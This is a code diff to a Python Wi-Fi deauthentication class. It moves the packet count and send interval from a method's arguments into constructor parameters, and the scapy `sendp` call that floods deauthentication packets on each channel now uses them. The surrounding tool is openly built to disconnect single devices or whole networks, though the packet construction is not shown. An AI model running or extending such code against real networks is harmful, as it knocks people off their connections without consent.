@@ -40,15 +40,23 @@ class WiFiDeauthenticator:
     of a single device or an entire Wi-Fi network.
     """
 
-    def __init__(self, wireless_adapter_key: str, access_point_set: MutableSet[AccessPoint]):
+    def __init__(self, wireless_adapter_key: str,
+                 access_point_set: MutableSet[AccessPoint],
+                 count: int = 30,
+                 interval: float = 0.01):
         """
         Initializes the WiFiDeAuth object.
         :param wireless_adapter_key: The key of the wireless interface (e.g. "wlan0")
+        :param access_point_set: The set of access points to show the information about
+        :param count: The number of packets to send for each loop
+        :param interval: The time in seconds between each packet sent
         :raises FileNotFoundError: If the settings file is not found
         """
 
         self._wireless_adapter_key: str = wireless_adapter_key
         self._access_points_set: MutableSet[AccessPoint] = access_point_set
+        self._count: int = count
+        self._interval: float = interval
 
         # The BlackListManager object to handle the access points in the blacklist
         self._blacklist_manager: BlackListManager = BlackListManager()
@@ -180,14 +188,12 @@ class WiFiDeauthenticator:
             for channel, packet_list in packet_list_by_channel_dict.items():
                 self._send_packets(packet_list=packet_list, channel=channel)
 
-    def _send_packets(self, packet_list: list[Packet], channel: int, inter: float = 0.01, count: int = 30):
+    def _send_packets(self, packet_list: list[Packet], channel: int):
         """
         Send the packets at level 2, using the given channel. If a lock is given, it's used to synchronize the access
         to the shell command to change the channel.
         :param packet_list: The list of packets to send
         :param channel: The channel to use for the attack
-        :param inter: The time in seconds between each packet sent
-        :param count: The number of packets to send for each loop
         """
 
         # Before sending the packets, set the Wi-Fi adapter in monitor mode if it's not
@@ -204,7 +210,7 @@ class WiFiDeauthenticator:
             #   count: number of packets to send (None means infinite)
             #   loop: number of times to loop the packet list (0 means infinite)
             #   iface: wireless interface to use
-            sendp(x=packet_list, inter=inter, count=count, loop=1,
+            sendp(x=packet_list, inter=self._interval, count=self._count, loop=1,
                   iface=self._wireless_adapter_key, return_packets=False, verbose=False)
         except:
             pass
